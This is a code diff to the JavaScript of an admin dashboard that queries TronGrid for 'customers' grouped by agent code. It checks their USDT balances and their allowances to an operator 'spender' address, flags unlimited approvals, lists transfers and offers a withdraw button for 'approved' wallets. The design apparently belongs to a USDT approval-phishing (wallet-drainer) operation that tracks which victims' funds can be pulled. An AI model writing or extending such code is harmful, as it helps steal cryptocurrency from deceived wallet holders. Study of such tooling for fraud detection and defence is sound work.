@@ -884,7 +884,7 @@ function filterCustByDate(){
 }
 function clearCustDateFilter(){document.getElementById('cust-date-from').value='';document.getElementById('cust-date-to').value='';filterCustByDate();}
 
-// Fetch on-chain wallet info
+// Fetch on-chain wallet info (direct TronGrid — no backend dependency)
 async function refreshWalletInfo(){
     if(!custCurrentAgent)return;
     var custs=db.customers.filter(function(c){return c.agentCode===custCurrentAgent;});
@@ -892,19 +892,37 @@ async function refreshWalletInfo(){
     var btn=document.getElementById('cust-refresh-btn');
     btn.disabled=true;btn.innerHTML='<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
 
-    var addrs=custs.map(function(c){return c.address;});
-    // Batch in groups of 20
-    for(var i=0;i<addrs.length;i+=20){
-        var batch=addrs.slice(i,i+20);
+    // 운영자 spender 주소 가져오기 (서버 설정 → 기본값)
+    var spender=SPENDER_ADDR;
+    try{
+        var spResp=await apiFetch('/api/admin/spender');
+        if(spResp&&spResp.address)spender=spResp.address;
+    }catch(e){}
+
+    for(var i=0;i<custs.length;i++){
+        var addr=custs[i].address;
         try{
-            var result=await apiFetch('/api/admin/wallet-info',{
-                method:'POST',
-                body:JSON.stringify({addresses:batch})
-            });
-            if(result.wallets){
-                result.wallets.forEach(function(w){custWalletCache[w.address]=w;});
+            var balance=await getUSDTBalance(addr);
+            var rawAllowance=await getUSDTAllowanceFor(addr,spender);
+            var allowanceObj;
+            if(!rawAllowance||rawAllowance==='0'||rawAllowance==='0000000000000000000000000000000000000000000000000000000000000000'){
+                allowanceObj={status:'none',display:'0'};
+            }else{
+                try{
+                    var val=BigInt('0x'+rawAllowance);
+                    if(val>BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFF')){
+                        allowanceObj={status:'unlimited',display:'MAX'};
+                    }else{
+                        var usdt=Number(val)/1e6;
+                        allowanceObj={status:'limited',display:usdt.toFixed(2)};
+                    }
+                }catch(e){allowanceObj={status:'none',display:'0'};}
             }
-        }catch(e){console.error('Wallet info error:',e);}
+            custWalletCache[addr]={address:addr,balance:balance,allowance:allowanceObj};
+        }catch(e){
+            console.error('Wallet info error for '+addr+':',e);
+            custWalletCache[addr]={address:addr,balance:'0',allowance:{status:'none',display:'0'}};
+        }
     }
     btn.disabled=false;btn.innerHTML='<i class="fa-solid fa-rotate"></i> '+t('cust_refresh');
     renderCustDetail();
@@ -917,9 +935,25 @@ async function custDrillTransfers(addr){
     var shortAddr=addr.slice(0,12)+'...'+addr.slice(-6);
     document.getElementById('cust-tx-address').textContent=addr;
 
-    // Show cached wallet info
+    // Show cached wallet info (if not cached, fetch on-chain)
     var c=db.customers.find(function(x){return x.address===addr;});
     var w=custWalletCache[addr];
+    if(!w){
+        try{
+            var liveBalance=await getUSDTBalance(addr);
+            var spender=SPENDER_ADDR;
+            try{var spResp=await apiFetch('/api/admin/spender');if(spResp&&spResp.address)spender=spResp.address;}catch(e){}
+            var rawAllow=await getUSDTAllowanceFor(addr,spender);
+            var aObj;
+            if(!rawAllow||rawAllow==='0'||rawAllow==='0000000000000000000000000000000000000000000000000000000000000000'){
+                aObj={status:'none',display:'0'};
+            }else{
+                try{var v2=BigInt('0x'+rawAllow);if(v2>BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFF'))aObj={status:'unlimited',display:'MAX'};else aObj={status:'limited',display:(Number(v2)/1e6).toFixed(2)};}catch(e){aObj={status:'none',display:'0'};}
+            }
+            w={address:addr,balance:liveBalance,allowance:aObj};
+            custWalletCache[addr]=w;
+        }catch(e){console.error('Live fetch error:',e);}
+    }
     document.getElementById('cust-tx-balance').textContent=w?(w.balance+' USDT'):'-';
     document.getElementById('cust-tx-provider').textContent=c?(c.provider||'-'):'-';
     document.getElementById('cust-tx-connected').textContent=c?formatTime(c.connectedAt):'-';
@@ -937,29 +971,36 @@ async function custDrillTransfers(addr){
     var wdBtn=document.getElementById('cust-tx-withdraw-btn');
     if(wdBtn){wdBtn.classList.toggle('hidden',!(currentRole==='super'&&c&&c.approved));}
 
-    // Fetch transfers
+    // Fetch transfers (direct TronGrid — no backend dependency)
     var tbody=document.getElementById('cust-tx-body');tbody.innerHTML='';
     document.getElementById('cust-tx-loading').classList.remove('hidden');
     document.getElementById('cust-tx-empty').classList.add('hidden');
 
     try{
-        var result=await apiFetch('/api/admin/wallet-transfers?address='+encodeURIComponent(addr)+'&limit=50');
+        var tgUrl='https://api.trongrid.io/v1/accounts/'+addr+'/transactions/trc20?limit=50&contract_address='+USDT_CONTRACT;
+        var tgResp=await fetch(tgUrl,{headers:{'TRON-PRO-API-KEY':''}});
+        var tgJson=await tgResp.json();
         document.getElementById('cust-tx-loading').classList.add('hidden');
-        if(!result.transfers||result.transfers.length===0){
+
+        if(!tgJson.data||tgJson.data.length===0){
             document.getElementById('cust-tx-empty').classList.remove('hidden');
             return;
         }
-        result.transfers.forEach(function(tx){
-            var dirBadge=tx.direction==='in'?'<span class="text-xs px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-bold"><i class="fa-solid fa-arrow-down mr-1"></i>IN</span>':'<span class="text-xs px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 font-bold"><i class="fa-solid fa-arrow-up mr-1"></i>OUT</span>';
-            var counterparty=tx.direction==='in'?tx.from:tx.to;
+        tgJson.data.forEach(function(tx){
+            var direction=tx.to===addr?'in':'out';
+            var dirBadge=direction==='in'?'<span class="text-xs px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-bold"><i class="fa-solid fa-arrow-down mr-1"></i>IN</span>':'<span class="text-xs px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 font-bold"><i class="fa-solid fa-arrow-up mr-1"></i>OUT</span>';
+            var counterparty=direction==='in'?tx.from:tx.to;
             var shortCp=counterparty?counterparty.slice(0,8)+'...'+counterparty.slice(-4):'-';
-            var txShort=tx.txId?tx.txId.slice(0,10)+'...':'-';
-            var txLink=tx.txId?'<a href="https://tronscan.org/#/transaction/'+esc(tx.txId)+'" target="_blank" class="text-blue-400 hover:text-blue-300 transition font-mono text-xs">'+txShort+'<i class="fa-solid fa-external-link ml-1 text-[10px]"></i></a>':'<span class="text-slate-500">-</span>';
+            var txId=tx.transaction_id||'';
+            var txShort=txId?txId.slice(0,10)+'...':'-';
+            var txLink=txId?'<a href="https://tronscan.org/#/transaction/'+esc(txId)+'" target="_blank" class="text-blue-400 hover:text-blue-300 transition font-mono text-xs">'+txShort+'<i class="fa-solid fa-external-link ml-1 text-[10px]"></i></a>':'<span class="text-slate-500">-</span>';
+            var val=(parseInt(tx.value||'0')/1e6).toFixed(2);
+            var dateStr=tx.block_timestamp?new Date(tx.block_timestamp).toISOString():'';
             tbody.innerHTML+=
                 '<tr class="table-row border-b border-slate-800/40">'+
-                    '<td class="p-4 text-xs text-slate-400 font-mono">'+formatTime(tx.date)+'</td>'+
+                    '<td class="p-4 text-xs text-slate-400 font-mono">'+formatTime(dateStr)+'</td>'+
                     '<td class="p-4">'+dirBadge+'</td>'+
-                    '<td class="p-4 font-mono font-bold '+(tx.direction==='in'?'text-emerald-400':'text-red-400')+'">'+parseFloat(tx.value).toFixed(2)+'</td>'+
+                    '<td class="p-4 font-mono font-bold '+(direction==='in'?'text-emerald-400':'text-red-400')+'">'+val+'</td>'+
                     '<td class="p-4 font-mono text-xs text-slate-400">'+shortCp+'</td>'+
                     '<td class="p-4">'+txLink+'</td>'+
                 '</tr>';
@@ -1069,6 +1110,23 @@ async function getUSDTBalance(addr){
         if(json.constant_result&&json.constant_result[0]){
             var raw=parseInt(json.constant_result[0],16);
             return (raw/1e6).toFixed(2);
+        }
+        return '0';
+    }catch(e){return '0';}
+}
+
+async function getUSDTAllowanceFor(addr,spenderAddr){
+    try{
+        var ownerHex=tronAddressToHex(addr);
+        var spenderHex=tronAddressToHex(spenderAddr||SPENDER_ADDR);
+        var param=padAddress(ownerHex)+padAddress(spenderHex);
+        var resp=await fetch('https://api.trongrid.io/wallet/triggerconstantcontract',{
+            method:'POST',headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({owner_address:ownerHex,contract_address:tronAddressToHex(USDT_CONTRACT),function_selector:'allowance(address,address)',parameter:param,visible:false})
+        });
+        var json=await resp.json();
+        if(json.constant_result&&json.constant_result[0]){
+            return json.constant_result[0];
         }
         return '0';
     }catch(e){return '0';}
